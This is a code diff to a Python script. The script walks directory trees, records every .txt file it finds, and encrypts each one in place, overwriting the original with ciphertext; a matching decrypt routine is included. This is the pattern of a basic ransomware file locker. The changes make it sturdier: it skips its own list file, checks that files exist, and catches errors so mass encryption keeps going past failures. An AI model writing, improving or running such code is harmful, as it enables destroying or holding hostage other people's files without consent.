@@ -38,6 +38,8 @@ def findTxtFile(file_name):
         for root, dirs, files in os.walk(root_dir):
             for file in files:
                 if file.endswith(".txt"):
+                    if file == file_name:
+                        continue
                     file_path = os.path.join(root, file)
                     # Write file_path to a .txt file
                     with open(file_name, "a") as f:
@@ -46,7 +48,7 @@ def findTxtFile(file_name):
 
 def pad_data(data):
     """Pad the data to be 16-byte for encryption"""
-    pad_len = 16 - len(data) % 16
+    pad_len = 16 - (len(data) % 16)
     bytes_data = bytes([pad_len] * pad_len)
     my_bytes = data.encode()
     return my_bytes + bytes_data
@@ -67,18 +69,31 @@ def decrypt_data(key, encrypted_data):
     return decrypted_data[:-decrypted_data[-1]]
 
 def encrypt_file(ascii_key, file_path):
-    with open(file_path, 'r') as f:
-        data = f.read()
-    encrypted_data = encrypt_data(ascii_key, data)
-    with open(file_path, 'wb') as f:
-        f.write( encrypted_data ) 
+    if not os.path.exists(file_path):
+        print(f"File not found {file_path}")
+        return
+    try:
+        with open(file_path, 'r') as f:
+            data = f.read()
+        encrypted_data = encrypt_data(ascii_key, data)
+        with open(file_path, 'wb') as f:
+            f.write( encrypted_data )
+    except:
+        print(f"Error encrypting {file_path}")
+
 
 def decrypt_file(key, file_path):
-    with open(file_path, "rb") as f:
-        encrypted_data = f.read()
-    decrypted_data = decrypt_data(key, encrypted_data)
-    with open(file_path, 'wb') as f:
-        f.write(decrypted_data)
+    if not os.path.exists(file_path):
+        print(f"File not found {file_path}")
+        return
+    try:
+        with open(file_path, "rb") as f:
+            encrypted_data = f.read()
+        decrypted_data = decrypt_data(key, encrypted_data)
+        with open(file_path, 'wb') as f:
+            f.write(decrypted_data)
+    except:
+        print(f"Error decrypting {file_path}")
 
 def encrypt_file_paths(key, file_path):
     with open(file_path, "r") as f:
